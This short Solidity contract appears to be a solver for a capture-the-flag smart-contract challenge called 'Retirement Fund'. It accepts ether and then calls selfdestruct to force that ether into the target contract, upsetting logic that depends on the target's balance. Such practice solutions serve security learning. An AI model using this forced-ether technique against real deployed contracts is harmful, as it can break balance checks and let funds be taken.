// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

contract RetirementFundChallengeSolver
{
    function solve(address payable challenge) payable external
    {
        require(msg.value > 0, "Need to send at least 1 wei");
        selfdestruct(challenge);
    }
}